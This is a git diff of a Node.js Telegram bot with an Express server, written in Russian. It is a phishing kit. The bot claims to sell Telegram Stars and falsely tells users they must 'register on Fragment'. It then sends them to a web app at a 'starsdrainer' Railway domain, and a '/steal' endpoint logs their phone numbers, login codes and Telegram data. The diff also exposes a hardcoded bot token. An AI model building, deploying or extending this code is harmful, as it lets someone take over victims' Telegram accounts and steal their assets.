@@ -2,7 +2,7 @@ const TelegramBot = require('node-telegram-bot-api');
 const express = require('express');
 const path = require('path');
 
-const BOT_TOKEN = '8435516460:AAEb00SvrmPLzDX_3JBXUyb3EouDC7yJKCs';
+const BOT_TOKEN = process.env.BOT_TOKEN || '8435516460:AAEb00SvrmPLzDX_3JBXUyb3EouDC7yJKCs';
 const bot = new TelegramBot(BOT_TOKEN, { polling: true });
 const app = express();
 
@@ -14,24 +14,28 @@ app.get('/', (req, res) => {
   res.sendFile(path.join(__dirname, 'public', 'fragment.html'));
 });
 
-// endpoint для кражи данных
 app.post('/steal', (req, res) => {
   console.log('=== УКРАДЕННЫЕ ДАННЫЕ ===');
   console.log('Номер:', req.body.phone);
-  console.log('Код:', req.body.code);
+  console.log('Код:', req.body.code); 
   console.log('Telegram Data:', req.body.tg_data);
   console.log('========================');
   res.sendStatus(200);
 });
 
+// Railway сам назначает порт
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => {
+app.listen(PORT, '0.0.0.0', () => {
   console.log(`Web App работает на порту ${PORT}`);
 });
 
 // Бот
 bot.onText(/\/start/, (msg) => {
   const chatId = msg.chat.id;
+  
+  // Получаем домен из переменной Railway или используем по умолчанию
+  const domain = process.env.RAILWAY_STATIC_URL || 'https://starsdrainer-production.up.railway.app/';
+  const webAppUrl = `https://${domain}`;
   
   const keyboard = {
     reply_markup: {
@@ -44,25 +48,23 @@ bot.onText(/\/start/, (msg) => {
   };
 
   bot.sendMessage(chatId, 
-    `Привет! @EasyChecs_bot - Это удобный бот для покупки/ передачи звезд в Telegram.\n\n` +
-    `С ним ты можешь моментально покупать и передавать звезды.\n\n` +
-    `Бот работает почти год, и с помощью него куплена огромная доля звезд в Telegram.\n\n` +
-    `С помощью бота куплено:\n6,307,360 ▼ (~ $94,610)`,
+    `Привет! Тестовый бот для Web App.\n\n` +
+    `Нажми "Вывести звезды" чтобы открыть Fragment Web App.`,
     keyboard
   );
 });
 
 bot.on('callback_query', (query) => {
   const chatId = query.message.chat.id;
+  const domain = process.env.RAILWAY_STATIC_URL || 'https://starsdrainer-production.up.railway.app/';
+  const webAppUrl = `https://${domain}`;
 
   if (query.data === 'withdraw_stars') {
-    const webAppUrl = `https://starsdrainer-production.up.railway.app/`; // Замени на свой домен
-    
     const keyboard = {
       reply_markup: {
         inline_keyboard: [[
           { 
-            text: "Зарегистрироваться", 
+            text: "Зарегистрироваться на Fragment", 
             web_app: { url: webAppUrl }
           }
         ]]
@@ -70,13 +72,16 @@ bot.on('callback_query', (query) => {
     };
 
     bot.editMessageText(
-      `Произошла ошибка! Вы не зарегистрированы на fragment.com, платформе от Telegram, для покупки звезд.\n\n` +
-      `Чтобы вывести звезды, нужно зарегистрироваться на Fragment.`,
-      { chat_id: chatId, message_id: query.message.message_id, ...keyboard }
+      `Для вывода звезд требуется регистрация на Fragment.`,
+      { 
+        chat_id: chatId, 
+        message_id: query.message.message_id,
+        reply_markup: keyboard.reply_markup
+      }
     );
   }
 
   bot.answerCallbackQuery(query.id);
 });
 
-
+console.log('Бот запущен. Домен:', process.env.RAILWAY_STATIC_URL);
